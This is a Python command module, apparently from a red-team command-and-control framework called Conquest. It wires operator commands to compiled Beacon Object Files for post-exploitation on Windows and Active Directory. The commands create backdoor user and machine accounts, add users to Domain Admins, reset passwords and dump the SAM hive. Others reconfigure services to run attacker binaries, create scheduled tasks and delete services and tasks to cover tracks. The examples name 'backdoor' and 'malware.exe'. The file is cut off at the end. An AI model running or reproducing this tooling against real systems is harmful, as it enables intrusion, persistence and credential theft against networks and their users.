import conquest 
import os.path

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_maq = (
    conquest.createCommand(name="get-maq", description="Retrieve MachineAccountQuota in the current domain.", example="get-maq",
                           message="Tasked agent to retrieve MachineAccountQuota.", mitre=[])
            .setHandler(lambda agentId, cmdline, args: (
                bof := conquest.modules_root() + "/remote-operations/AddMachineAccount/GetMachineAccountQuota.x64.o",
                conquest.execute_alias(agentId, cmdline, f"bof {bof}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("remote operations")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_addComputer = (
    conquest.createCommand(name="add-computer", description="Add computer account to the Active Directory domain.", example="add-computer FAKE01 Password123!",
                           message="Tasked agent to add a computer account.", mitre=["T1136"])
            .addArgString("name", "Name of the computer account to add.", True)
            .addArgString("password", "Password of the new computer account.", True)
            .setHandler(lambda agentId, cmdline, args: (
                name := conquest.get_string(args, 0).rstrip("$"),   # Remove trailing '$' from computer name
                password := conquest.get_string(args, 1),

                bof := conquest.modules_root() + "/remote-operations/AddMachineAccount/AddMachineAccount.x64.o",
                params := conquest.bof_pack("ZZ", [
                    name,              # Z: Computer name
                    password           # Z: Password
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("remote operations")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_delComputer = (
    conquest.createCommand(name="del-computer", description="Delete computer account from the Active Directory domain.", example="del-computer FAKE01",
                           message="Tasked agent to delete a computer account.", mitre=[])
            .addArgString("name", "Name of the computer account to delete.", True)
            .setHandler(lambda agentId, cmdline, args: (
                name := conquest.get_string(args, 0).rstrip("$"),   # Remove trailing '$' from computer name

                bof := conquest.modules_root() + "/remote-operations/AddMachineAccount/DelMachineAccount.x64.o",
                params := conquest.bof_pack("Z", [
                    name,              # Z: Computer name
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("remote operations")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_addUser = ( 
    conquest.createCommand(name="add-user", description="Add a user to a machine.", example="add-user backdoor Password123!",
                           message="Tasked agent to add a user.", mitre=["T1136.001", "T1136.002"])
            .addArgString("username", "Username of the new account.", True)
            .addArgString("password", "Password of the new account.", True)
            .addFlagString("--server", "server", "Specify target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
                username := conquest.get_string(args, 0),
                password := conquest.get_string(args, 1),
                server := conquest.get_string(args, 2),

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/adduser/adduser.x64.o",
                params := conquest.bof_pack("ZZZ", [
                    username,           # Z: Username
                    password,           # Z: Password
                    server,             # Z: Target system
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("remote operations")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_addGroupmembership = ( 
    conquest.createCommand(name="add-groupmembership", description="Add a specified user to a group.", example="add-groupmembership conquest.local\\backdoor \"Domain Admins\" --server dc01",
                           message="Tasked agent to add a user to a group.", mitre=["T1098.001", "T1078.002"])
            .addArgString("user", "Target account in format domain.local\\username. If the user is a local account, only specify the username", True)
            .addArgString("group", "Name of the target group.", True)
            .addFlagString("--server", "server", "Specify target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
                user := conquest.get_string(args, 0),
                group := conquest.get_string(args, 1),
                server := conquest.get_string(args, 2),
                
                domain := user.split('\\')[0] if '\\' in user else "",
                username := user.split('\\')[1] if '\\' in user else user,

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/addusertogroup/addusertogroup.x64.o",
                params := conquest.bof_pack("ZZZZ", [
                    domain,             # Z: Domain (empty if local account)
                    server,             # Z: Target system
                    username,           # Z: Target user
                    group,              # Z: Target group
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("remote operations")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_enableUser = ( 
    conquest.createCommand(name="enable-user", description="Enable a specified user account.", example="enable-user conquest.local\\user",
                           message="Tasked agent to enable a user.", mitre=["T1098"])
            .addArgString("user", "Target account in format domain.local\\username. If the user is a local account, only specify the username", True)
            .setHandler(lambda agentId, cmdline, args: (
                user := conquest.get_string(args, 0),
                                
                domain := user.split('\\')[0] if '\\' in user else "",
                username := user.split('\\')[1] if '\\' in user else user,

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/enableuser/enableuser.x64.o",
                params := conquest.bof_pack("ZZ", [
                    domain,             # Z: Domain (empty if local account)
                    username,           # Z: Target user
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("remote operations")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_unexpireUser = ( 
    conquest.createCommand(name="unexpire-user", description="Unexpire and enable a specified user account.", example="unexpire-user conquest.local\\user",
                           message="Tasked agent to unexpire a user.", mitre=["T1098"])
            .addArgString("user", "Target account in format domain.local\\username. If the user is a local account, only specify the username", True)
            .setHandler(lambda agentId, cmdline, args: (
                user := conquest.get_string(args, 0),
                                
                domain := user.split('\\')[0] if '\\' in user else "",
                username := user.split('\\')[1] if '\\' in user else user,

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/unexpireuser/unexpireuser.x64.o",
                params := conquest.bof_pack("ZZ", [
                    domain,             # Z: Domain (empty if local account)
                    username,           # Z: Target user
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("remote operations")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_setPassword = ( 
    conquest.createCommand(name="set-password", description="Set the password of a target user account.", example="set-password conquest.local\\user Password123!",
                           message="Tasked agent to set user password.", mitre=["T1098"])
            .addArgString("user", "Target account in format domain.local\\username. If the user is a local account, only specify the username", True)
            .addArgString("password", "New password", True)
            .setHandler(lambda agentId, cmdline, args: (
                user := conquest.get_string(args, 0),
                password := conquest.get_string(args, 1),
                                
                domain := user.split('\\')[0] if '\\' in user else "",
                username := user.split('\\')[1] if '\\' in user else user,

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/setuserpass/setuserpass.x64.o",
                params := conquest.bof_pack("ZZZ", [
                    domain,             # Z: Domain (empty if local account)
                    username,           # Z: Target user
                    password,           # Z: Password
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("remote operations")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

REGISTRY_HIVES = {
    "HKCR": 0,  # HKEY_CLASSES_ROOT
    "HKCU": 1,  # HKEY_CURRENT_USER
    "HKLM": 2,  # HKEY_LOCAL_MACHINE
    "HKU": 3    # HKEY_USERS
}

# https://learn.microsoft.com/en-us/dotnet/api/microsoft.win32.registryvaluekind?view=net-10.0
REGISTRY_TYPES = {
    "REG_SZ": 1,
    "REG_EXPAND_SZ": 2,
    "REG_BINARY": 3,
    "REG_DWORD": 4,
    "REG_MULTI_SZ": 7,
    "REG_QWORD": 11
}

# Pack DWORD as 4 bytes little-endian (equivalent to pack("I-", key))
def pack_dword(key):
    val = int(key)
    return bytes([
        val & 0xFF,
        (val >> 8) & 0xFF,
        (val >> 16) & 0xFF,
        (val >> 24) & 0xFF
    ])

def _regSet(agentId, cmdline, args): 
    hive = conquest.get_string(args, 0).upper()
    path = conquest.get_string(args, 1)
    type = conquest.get_string(args, 2).upper()
    data = conquest.get_string(args, 3)
    key = conquest.get_string(args, 4)  
    server = conquest.get_string(args, 5)
    
    # Validate hive
    reg_hive = REGISTRY_HIVES.get(hive)
    if reg_hive is None:
        conquest.error(agentId, f"Invalid registry hive: {hive}.", cmdline)
        return
    
    # Validate type
    reg_type = REGISTRY_TYPES.get(type)
    if reg_type is None:
        conquest.error(agentId, f"Invalid registry type: {type}.", cmdline)
        return
    
    # Prepare server (add \\ prefix if specified)
    if server:
        server = f"\\\\{server}"
    
    pack_fmt = "zizzi"    
    try:
        if type in ["REG_DWORD", "REG_QWORD"]:
            # Integer types: pack as binary
            pack_fmt += "b"
            reg_data = conquest.pack("i", [data])
        
        elif type == "REG_MULTI_SZ":
            # Multiple strings: encode as UTF-16LE with double null terminator
            pack_fmt += "b"
            reg_data = data.encode('utf-16le') + b'\x00\x00\x00\x00'
        
        elif type in ["REG_SZ", "REG_EXPAND_SZ"]:
            # String types: pack as string
            pack_fmt += "z"
            reg_data = data
        
        elif type == "REG_BINARY":
            # Binary: read from file
            pack_fmt += "b"
            with open(data, 'rb') as f:
                reg_data = f.read()
        
        else:
            conquest.error(agentId, f"Unsupported registry type: {type}", cmdline)
            return 
    except ValueError:
        conquest.error(agentId, f"Invalid key for {type}: {data}", cmdline)
        return
    except FileNotFoundError:
        conquest.error(agentId, f"File not found: {data}", cmdline)
        return
    except Exception as e:
        conquest.error(agentId, f"Error processing data: {str(e)}", cmdline)
        return
    
    bof = conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/reg_set/reg_set.x64.o"    
    params = conquest.bof_pack(pack_fmt, [
        server,             # z: Hostname (empty or \\server)
        reg_hive,           # i: Registry hive (0=HKCR, 1=HKCU, 2=HKLM, 3=HKU)
        path,               # z: Registry path
        key,                # z: Key name
        reg_type,           # i: Type (1=REG_SZ, 2=REG_EXPAND_SZ, 3=REG_BINARY, 4=REG_DWORD, 7=REG_MULTI_SZ, 11=REG_QWORD)
        reg_data            # z|b: Data 
    ])
    
    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)

cmd_regSet = ( 
    conquest.createCommand(name="reg-set", description="Create or set a registry key/value on a target system.", example="reg-set HKCU \"Software\\TestApp\" TestValue REG_SZ \"Hello World\"",
                           message="Tasked agent to set a registry key.", mitre=["T1112"])
            .addArgString("hive", """Registry hive.
Available options:
  - HKCR    HKEY_CLASSES_ROOT
  - HKCU    HKEY_CURRENT_USER
  - HKLM    HKEY_LOCAL_MACHINE
  - HKU     HKEY_USERS""", True)
            .addArgString("path", "Path to the registry key to modify.", True)
            .addArgString("type", """Type of the registry key.
Available options: 
  - REG_SZ              String key
  - REG_EXPAND_SZ       Expandable string
  - REG_BINARY          Binary data (provide file path)
  - REG_DWORD           32-bit integer
  - REG_MULTI_SZ        Multiple strings
  - REG_QWORD           64-bit integer""", True)
            .addArgString("data", "Data to store in the registry key.", True)
            .addFlagString("--key", "key", "Name of the registry key (default: \"\").")
            .addFlagString("--server", "server", "Target server for remote registry (default: local computer).")
            .setHandler(_regSet)
).registerToGroup("windows registry")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def _regDelete(agentId, cmdline, args): 
    hive = conquest.get_string(args, 0).upper()
    path = conquest.get_string(args, 1)
    key = conquest.get_string(args, 2)
    deleteKey = conquest.get_bool(args, 3)  
    server = conquest.get_string(args, 4)
    
    # Validate hive
    reg_hive = REGISTRY_HIVES.get(hive)
    if reg_hive is None:
        conquest.error(agentId, f"Invalid registry hive: {hive}.", cmdline)
        return
    
    # Prepare server (add \\ prefix if specified)
    if server:
        server = f"\\\\{server}"
    
    bof = conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/reg_delete/reg_delete.x64.o"    
    params = conquest.bof_pack("zizzi", [
        server,                     # z: Hostname (empty or \\server)
        reg_hive,                   # i: Registry hive (0=HKCR, 1=HKCU, 2=HKLM, 3=HKU)
        path,                       # z: Registry path
        key,                        # z: Key name 
        int(deleteKey),             # i: Delete entire registry key
    ])
    
    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)


cmd_regDelete = ( 
    conquest.createCommand(name="reg-delete", description="Delete a registry key/key on a target system.", example="reg-delete HKCU \"Software\\TestApp\" --key myValue",
                           message="Tasked agent to delete a registry key.", mitre=["T1112"])
            .addArgString("hive", """Registry hive.
Available options:
  - HKCR    HKEY_CLASSES_ROOT
  - HKCU    HKEY_CURRENT_USER
  - HKLM    HKEY_LOCAL_MACHINE
  - HKU     HKEY_USERS""", True)
            .addArgString("path", "Path to the registry key to delete.", True)
            .addFlagString("--key", "key", "Name of the registry key to delete (default: \"\").")
            .addFlagBool("--delete-key", "delete-key", "Set this flag to delete the entire registry key.")
            .addFlagString("--server", "server", "Target server for remote registry (default: local computer).")
            .setHandler(_regDelete)
).registerToGroup("windows registry")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def _regSave(agentId, cmdline, args): 
    hive = conquest.get_string(args, 0).upper()
    path = conquest.get_string(args, 1)
    outfile = conquest.get_string(args, 2)
    
    # Validate hive
    reg_hive = REGISTRY_HIVES.get(hive)
    if reg_hive is None:
        conquest.error(agentId, f"Invalid registry hive: {hive}.", cmdline)
        return
    
    bof = conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/reg_save/reg_save.x64.o"    
    params = conquest.bof_pack("zzi", [
        path,                       # z: Registry path
        outfile,                    # z: Output file
        reg_hive,                   # i: Registry hive (0=HKCR, 1=HKCU, 2=HKLM, 3=HKU)
    ])
    
    if os.path.exists(bof):
        conquest.execute_alias(agentId, "enable-privilege SeBackupPrivilege", f"enable-privilege SeBackupPrivilege")    # SeBackupPrivilege is required, so enable it first
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)


cmd_regSave = ( 
    conquest.createCommand(name="reg-save", description="Save a specified registry key to a file on the target system.", example="reg-save HKLM SAM C:\\Windows\\Tasks\\sam.txt",
                           message="Tasked agent to save a registry key.", mitre=["T1003.002"])
            .addArgString("hive", """Registry hive.
Available options:
  - HKCR    HKEY_CLASSES_ROOT
  - HKCU    HKEY_CURRENT_USER
  - HKLM    HKEY_LOCAL_MACHINE
  - HKU     HKEY_USERS""", True)
            .addArgString("path", "Path to the registry key to save.", True)
            .addArgString("output-file", "Output file.", True)
            .setHandler(_regSave)
).registerToGroup("windows registry")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_scConfig = (
    conquest.createCommand(name="sc-config", description="Configure an existing service on the target system", example="sc-config ConquestSvc C:\\Temp\\malware.exe",
                           message="Tasked agent to configure a service.", mitre=["T1543.003", "T1574.011"])
            .addArgString("service", "Service to configure.", True)
            .addArgString("binPath", "Binary path to set on the service.")
            .addFlagInt("--error-mode", "error-mode", """Error mode.
Available options:
    - 0: ignore errors 
    - 1: normal logging (default) 
    - 2: log severe errors
    - 3: log critical errors""", False, 1)
            .addFlagInt("--start-mode", "start-mode", """Start mode.
Available options:
    - 2: auto start (default)
    - 3: on demand start 
    - 4: disabled""", False, 2)
            .addFlagString("--server", "server", "Hostname or IP address of the target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
                service := conquest.get_string(args, 0),
                binPath := conquest.get_string(args, 1),
                errorMode := conquest.get_int(args, 2),
                startMode := conquest.get_int(args, 3),
                server := conquest.get_string(args, 4),

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/sc_config/sc_config.x64.o",
                params := conquest.bof_pack("zzzss", [
                    server,             # z: Target system
                    service,            # z: Target service
                    binPath,            # z: Binary Path
                    errorMode,          # s: Error mode
                    startMode,          # s: Start mode
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("windows services")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

# https://learn.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicetype?view=net-10.0-pp
SERVICE_TYPES = {
    "SERVICE_FILE_SYSTEM_DRIVER": 2,
    "SERVICE_KERNEL_DRIVER": 1, 
    "SERVICE_WIN32_OWN_PROCESS": 16,
    "SERVICE_WIN32_SHARE_PROCESS": 32
}
def _scCreate(agentId, cmdline, args): 
    service = conquest.get_string(args, 0)
    displayName = conquest.get_string(args, 1)
    binPath = conquest.get_string(args, 2)
    description = conquest.get_string(args, 3)
    errorMode = conquest.get_int(args, 4)
    startMode = conquest.get_int(args, 5)
    type = conquest.get_string(args, 6).upper()
    server = conquest.get_string(args, 7)

    # Validate service type
    scType = SERVICE_TYPES.get(type)
    if scType is None:
        conquest.error(agentId, f"Invalid service type: {type}.", cmdline)
        return

    bof = conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/sc_create/sc_create.x64.o"
    params = conquest.bof_pack("zzzzzsss", [
        server,             # z: Target system
        service,            # z: Target service
        binPath,            # z: Binary Path
        displayName,        # z: DisplayName
        description,        # z: Description 
        errorMode,          # s: Error mode
        startMode,          # s: Start mode
        scType,             # s: Service type
    ])

    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)

cmd_scCreate = (
 conquest.createCommand(name="sc-create", description="Create a service on the target system", example="sc-create ConquestSvc \"Conquest Service\" C:\\Windows\\System32\\calc.exe --description \"Conquest service description.\"",
                           message="Tasked agent to configure a service.", mitre=["T1543.003"])
            .addArgString("service", "Service name.", True)
            .addArgString("display-name", "Display name of the service to create.", True)
            .addArgString("binPath", "Binary path of the service to create.", True)
            .addFlagString("--description", "description", "Description of the service to create (default: \"\").")
            .addFlagInt("--error-mode", "error-mode", """Error mode.
Available options:
    - 0: ignore errors
    - 1: normal logging (default)
    - 2: log severe errors
    - 3: log critical errors""", False, 1)
            .addFlagInt("--start-mode", "start-mode", """Start mode.
Available options:
    - 2: auto start (default)
    - 3: on demand start 
    - 4: disabled""", False, 2)
            .addFlagString("--sc-type", "service-type", """Type of the service to create.
                        Available options: 
- SERVICE_FILE_SYSTEM_DRIVER
- SERVICE_KERNEL_DRIVER
- SERVICE_WIN32_OWN_PROCESS (default)
- SERVICE_WIN32_SHARE_PROCESS""", False, "SERVICE_WIN32_OWN_PROCESS")
            .addFlagString("--server", "server", "Hostname or IP address of the target system (default: local computer).")
            .setHandler(_scCreate)
).registerToGroup("windows services")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_scDelete = (
    conquest.createCommand(name="sc-delete", description="Delete a service on the target system", example="sc-delete ConquestSvc --server dc01",
                           message="Tasked agent to delete a service.", mitre=["T1070"])
            .addArgString("service", "Name of the service to delete.", True)
            .addFlagString("--server", "server", "Hostname or IP address of the target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
                service := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1), 

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/sc_delete/sc_delete.x64.o",
                params := conquest.bof_pack("zz", [
                    server,             # z: Target system
                    service,            # z: Target service
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("windows services")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_scStart = (
    conquest.createCommand(name="sc-start", description="Start a service on the target system", example="sc-start ConquestSvc --server dc01",
                           message="Tasked agent to start a service.", mitre=["T1569.002"])
            .addArgString("service", "Name of the service to start.", True)
            .addFlagString("--server", "server", "Hostname or IP address of the target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
                service := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1), 

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/sc_start/sc_start.x64.o",
                params := conquest.bof_pack("zz", [
                    server,             # z: Target system
                    service,            # z: Target service
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("windows services")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_scStop = (
    conquest.createCommand(name="sc-stop", description="Stop a service on the target system", example="sc-stop ConquestSvc --server dc01",
                           message="Tasked agent to stop a service.", mitre=["T1489"])
            .addArgString("service", "Name of the service to stop.", True)
            .addFlagString("--server", "server", "Hostname or IP address of the target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
                service := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1), 

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/sc_stop/sc_stop.x64.o",
                params := conquest.bof_pack("zz", [
                    server,             # z: Target system
                    service,            # z: Target service
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("windows services")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

SCHTASKS_USER_MODE = {
    "USER": 0,
    "SYSTEM": 1,
    "XML": 2,
    "PASSWORD": 3
}

def _schtasksCreate(agentId, cmdline, args): 
    task = conquest.get_string(args, 0)
    xmlName, xmlBytes = conquest.get_file(args, 1)
    mode = conquest.get_string(args, 2).upper()
    user = conquest.get_string(args, 3)
    password = conquest.get_string(args, 4)
    update = conquest.get_bool(args, 5)
    server = conquest.get_string(args, 6)
    
    # Validate user mode 
    userMode = SCHTASKS_USER_MODE.get(mode)
    if userMode is None:
        conquest.error(agentId, f"Invalid value for argument --user-mode: {mode}.", cmdline)
        return
    
    # Decode XML (try UTF-16-LE first, fall back to UTF-8)
    try:
        xml = bytes(xmlBytes).decode('utf-16-le')
    except (UnicodeDecodeError, UnicodeError):
        xml = bytes(xmlBytes).decode('utf-8')

    bof = conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/schtaskscreate/schtaskscreate.x64.o"
    params = conquest.bof_pack("ZZZZZii", [
        server,         # Z: Target system
        user,           # Z: Username
        password,       # Z: Password
        task,           # Z: Path to the scheduled task to create
        xml,            # Z: XML task definition
        userMode,       # i: User mode 
        int(update)     # i: Overwrite/update task if already existing   
    ])
    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)

cmd_schtasksCreate = ( 
    conquest.createCommand(name="schtasks-create", description="Create a scheduled task on the target system", example="schtasks-create \"\\MyTasks\\TestTask\" /local/path/to/task.xml --user-mode:SYSTEM --update", 
                           message="Tasked agent to create a scheduled task.", mitre=["T1053.005"])
            .addArgString("task", "Path for the created scheduled task.", True)
            .addArgFile("xml", "File containing the XML task definition.\nCreate XML from existing task: schtasks /query /tn \"\\Microsoft\\Windows\\Defrag\\ScheduledDefrag\" /xml > task.xml", True)
            .addFlagString("--user-mode", "mode", """Available options:
    - USER: current user context (default)
    - XML: user from XML task definition
    - SYSTEM: local system service
    - PASSWORD: credentials passed using --user and --password parameters""", False, "USER")
            .addFlagString("--user", "user", "Username of the user the task will run as (default: current user).")
            .addFlagString("--password", "password", "Password of the user the task will run as (default: current user).")
            .addFlagBool("--update", "update", "Specify to update a scheduled task if it already exists. If a tasks already exists and this flag is not set, the creation will fail.")
            .addFlagString("--server", "server", "Hostname or IP address of the target system (default: local computer).")
            .setHandler(_schtasksCreate)
).registerToGroup("scheduled tasks")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_schtasksDelete = (
    conquest.createCommand(name="schtasks-delete", description="Delete a scheduled task or task folder on the target system", example="schtasks-delete \\MyTasks --folder", 
                           message="Tasked agent to create a scheduled task.", mitre=["T1070"])
            .addFlagString("--task", "task", "Path for the scheduled task to delete.")
            .addFlagString("--folder", "folder", "Path for the folder to delete (must be empty).")
            .addFlagString("--server", "server", "Hostname or IP address of the target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
                task := conquest.get_string(args, 0),
                folder := conquest.get_string(args, 1),
                server := conquest.get_string(args, 2),

                # Only one option must be set at the same time
                conquest.error(agentId, "Must specify either --task or --folder.", cmdline) if ((task and folder) or (not task and not folder)) 
                else (

                    bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/schtasksdelete/schtasksdelete.x64.o",
                    params := conquest.bof_pack("ZZi", [
                        server,                     # Z: Target system
                        task if task else folder,   # Z: Path (task or folder)
                        1 if folder else 0          # i: isFolder (1=folder, 0=task)
                    ]),

                    conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                    else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
                )
            ))
).registerToGroup("scheduled tasks") 

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_schtasksStart = (
    conquest.createCommand(name="schtasks-start", description="Run a scheduled task on the target system", example="schtasks-start \\MyTasks\\ConquestTask", 
                           message="Tasked agent to run a scheduled task.", mitre=["T1053.005"])
            .addArgString("task", "Path for the scheduled task.", True)
            .addFlagString("--server", "server", "Hostname or IP address of the target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
                task := conquest.get_string(args, 0),
                server := conquest.get_string(args, 1),

                bof := conquest.modules_root() + "/remote-operations/CS-Remote-OPs-BOF/Remote/schtasksrun/schtasksrun.x64.o",
                params := conquest.bof_pack("ZZ", [
                    server,                 # Z: Target system
                    task                    # Z: Path to task
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("scheduled tasks") 

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_schtasksStop = (
    conquest.createCommand(name="schtasks-stop", description="Stop a running scheduled task on the target system", example="schtasks-stop \\MyTasks\\ConquestTask", 
                           message="Tasked agent to stop a scheduled task.", mitre=["T1053.005"])
            .addArgString("task", "Path for the scheduled task.", True)
            .addFlagString("--server", "server", "Hostname or IP address of the target system (default: local computer).")
            .setHandler(lambda agentId, cmdline, args: (
